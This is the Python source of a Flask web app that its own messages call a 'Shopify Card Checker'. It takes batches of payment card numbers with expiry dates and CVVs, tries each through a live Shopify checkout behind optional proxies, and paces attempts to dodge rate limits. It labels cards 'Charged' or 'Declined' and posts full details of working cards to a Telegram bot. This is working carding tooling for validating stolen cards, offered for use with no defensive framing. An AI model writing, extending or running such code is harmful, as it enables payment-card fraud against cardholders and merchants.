import os
import json
import threading
import time
import requests
import re
from flask import Flask, render_template, request, jsonify, redirect, url_for
from enhanced_shopify_bot import EnhancedShopifyBot

# Use requests for Telegram instead of the telegram package to avoid dependency issues
class TelegramSender:
    @staticmethod
    def send_message(bot_token, chat_id, message):
        """Send a message to a Telegram user using the Telegram API directly"""
        try:
            if not bot_token or not chat_id:
                return False

            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }

            response = requests.post(url, data=data)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram error: {str(e)}")
            return False

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Global variables
processing_status = {
    'is_running': False,
    'is_paused': False,
    'total_cards': 0,
    'processed_cards': 0,
    'successful_cards': 0,
    'failed_cards': 0,
    'current_card': '',
    'results': [],
    'telegram_bot_token': '',
    'telegram_user_id': '',
    'shopify_url': '',
    'custom_proxy': '',
    'stop_requested': False
}

# Thread for processing cards
processing_thread = None

def send_telegram_message(bot_token, chat_id, message):
    """Send a message to a Telegram user"""
    return TelegramSender.send_message(bot_token, chat_id, message)

def process_cards(cards, shopify_url, telegram_bot_token, telegram_user_id, custom_proxy=None):
    """Process a list of cards in a separate thread"""
    global processing_status

    processing_status['total_cards'] = len(cards)
    processing_status['processed_cards'] = 0
    processing_status['successful_cards'] = 0
    processing_status['failed_cards'] = 0
    processing_status['results'] = []

    for card_data in cards:
        # Check if stop was requested
        if processing_status['stop_requested']:
            processing_status['is_running'] = False
            processing_status['stop_requested'] = False
            break

        # Check if paused
        while processing_status['is_paused'] and not processing_status['stop_requested']:
            time.sleep(1)

        # Parse card data
        parts = card_data.strip().split('|')
        if len(parts) < 4:
            result = {
                'card': card_data,
                'status': False,
                'message': 'Invalid card format',
                'result': 'Error',
                'gateway': 'N/A'
            }
        else:
            cc = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()

            processing_status['current_card'] = f"{cc}|{month}|{year}|{cvv}"

            # Process the card
            try:
                # Initialize the enhanced bot
                processor = EnhancedShopifyBot(custom_proxy=custom_proxy)
                
                # Test the checkout process
                result = processor.test_checkout(shopify_url, cc, month, year, cvv)
                
                # Format the result for the UI
                formatted_result = {
                    'status': result.get('success', False),
                    'message': result.get('error', 'Success'),
                    'result': 'Charged' if result.get('success', False) else 'Declined',
                    'gateway': 'Shopify Checkout',
                    'thank_you_page': result.get('thank_you_page', '')
                }
                
                # If there's a thank you page, extract the order ID
                if 'thank_you_page' in result:
                    order_id_match = re.search(r'order/([^/?]+)', result['thank_you_page'])
                    if order_id_match:
                        formatted_result['result'] = f"Charged - Order #{order_id_match.group(1)}"
                
                result = formatted_result
                
            except Exception as e:
                result = {
                    'status': False,
                    'message': f'Error: {str(e)}',
                    'result': 'Error',
                    'gateway': 'N/A'
                }

            # Add card info to result
            result['card'] = card_data

            # Send success to Telegram if configured
            if result.get('status') and telegram_bot_token and telegram_user_id:
                # Extract amount if available
                amount = ""
                if "Charged" in result.get('result', ''):
                    amount_match = re.search(r'Charged\s+(\$\d+\.\d+)', result.get('result', ''))
                    if amount_match:
                        amount = f"💰 Amount: {amount_match.group(1)}\\n"
                    else:
                        amount = "💰 Amount: Unknown\\n"

                message = f"✅ *Successful Card*\\n" \
                          f"💳 `{card_data}`\\n" \
                          f"🔍 Result: {result.get('result', 'N/A')}\\n" \
                          f"{amount}" \
                          f"📝 Message: {result.get('message', 'N/A')}\\n" \
                          f"🌐 Gateway: {result.get('gateway', 'N/A')}"
                send_telegram_message(telegram_bot_token, telegram_user_id, message)

        # Update statistics
        processing_status['processed_cards'] += 1
        if result.get('status'):
            processing_status['successful_cards'] += 1
        else:
            processing_status['failed_cards'] += 1

        # Add to results
        processing_status['results'].append(result)

        # Sleep to avoid rate limiting
        time.sleep(2)

    processing_status['is_running'] = False
    processing_status['current_card'] = ''

def check_proxy(custom_proxy=None):
    """Check if proxies are working"""
    try:
        processor = EnhancedShopifyBot(custom_proxy=custom_proxy)
        response = processor.session.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return {'status': True, 'ip': response.json().get('ip', 'Unknown')}
        return {'status': False, 'message': 'Failed to get IP'}
    except Exception as e:
        return {'status': False, 'message': str(e)}

def check_shopify_url(url, custom_proxy=None):
    """Check if the Shopify URL is valid and can add to cart"""
    try:
        processor = EnhancedShopifyBot(custom_proxy=custom_proxy)

        # Get product info
        product_info = processor.get_product_info(url)

        if not product_info:
            return {'status': False, 'message': 'Failed to fetch product information'}

        return {
            'status': True,
            'message': 'Valid Shopify product',
            'title': product_info.get('title', 'Unknown Product'),
            'price': product_info.get('price', 'Unknown'),
            'variant_id': product_info.get('variant_id')
        }
    except Exception as e:
        return {'status': False, 'message': str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check_proxy', methods=['POST'])
def api_check_proxy():
    custom_proxy = request.json.get('proxy', None)
    result = check_proxy(custom_proxy)
    return jsonify(result)

@app.route('/api/check_url', methods=['POST'])
def api_check_url():
    url = request.json.get('url', '')
    custom_proxy = request.json.get('proxy', None)
    if not url:
        return jsonify({'status': False, 'message': 'URL is required'})

    result = check_shopify_url(url, custom_proxy)
    return jsonify(result)

@app.route('/api/start_process', methods=['POST'])
def api_start_process():
    global processing_thread, processing_status

    # Check if already running
    if processing_status['is_running']:
        return jsonify({'status': False, 'message': 'Process is already running'})

    # Get parameters
    data = request.json
    cards_text = data.get('cards', '')
    shopify_url = data.get('shopify_url', '')
    telegram_bot_token = data.get('telegram_bot_token', '')
    telegram_user_id = data.get('telegram_user_id', '')
    custom_proxy = data.get('custom_proxy', '')

    # Validate parameters
    if not cards_text:
        return jsonify({'status': False, 'message': 'No cards provided'})

    if not shopify_url:
        return jsonify({'status': False, 'message': 'Shopify URL is required'})

    # Parse cards
    cards = [line.strip() for line in cards_text.split('\n') if line.strip()]

    # Start processing thread
    processing_status['is_running'] = True
    processing_status['is_paused'] = False
    processing_status['stop_requested'] = False
    processing_status['telegram_bot_token'] = telegram_bot_token
    processing_status['telegram_user_id'] = telegram_user_id
    processing_status['shopify_url'] = shopify_url
    processing_status['custom_proxy'] = custom_proxy

    processing_thread = threading.Thread(
        target=process_cards,
        args=(cards, shopify_url, telegram_bot_token, telegram_user_id, custom_proxy)
    )
    processing_thread.daemon = True
    processing_thread.start()

    return jsonify({'status': True, 'message': 'Processing started'})

@app.route('/api/test_telegram', methods=['POST'])
def api_test_telegram():
    # Get parameters
    data = request.json
    telegram_bot_token = data.get('telegram_bot_token', '')
    telegram_user_id = data.get('telegram_user_id', '')

    # Validate parameters
    if not telegram_bot_token:
        return jsonify({'status': False, 'message': 'Telegram bot token is required'})

    if not telegram_user_id:
        return jsonify({'status': False, 'message': 'Telegram user ID is required'})

    # Send test message
    message = "🔔 *Test Notification*\\n" \
              "This is a test message from your Shopify Card Checker.\\n" \
              "✅ Notifications are working correctly!"
    
    result = send_telegram_message(telegram_bot_token, telegram_user_id, message)
    
    if result:
        return jsonify({'status': True, 'message': 'Test message sent successfully'})
    else:
        return jsonify({'status': False, 'message': 'Failed to send test message'})

@app.route('/api/stop_process', methods=['POST'])
def api_stop_process():
    global processing_status

    if not processing_status['is_running']:
        return jsonify({'status': False, 'message': 'No process is running'})

    processing_status['stop_requested'] = True
    return jsonify({'status': True, 'message': 'Stop requested'})

@app.route('/api/pause_process', methods=['POST'])
def api_pause_process():
    global processing_status

    if not processing_status['is_running']:
        return jsonify({'status': False, 'message': 'No process is running'})

    processing_status['is_paused'] = not processing_status['is_paused']
    status = 'paused' if processing_status['is_paused'] else 'resumed'

    return jsonify({'status': True, 'message': f'Process {status}', 'paused': processing_status['is_paused']})

@app.route('/api/status', methods=['GET'])
def api_status():
    return jsonify(processing_status)

# Set CORS headers to allow iframe and cross-origin requests
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

if __name__ == '__main__':
    # Create templates directory if it doesn't exist
    os.makedirs('templates', exist_ok=True)

    # Get port from environment variable for Render compatibility
    port = int(os.environ.get('PORT', 12000))

    # Run the app
    app.run(host='0.0.0.0', port=port, debug=False)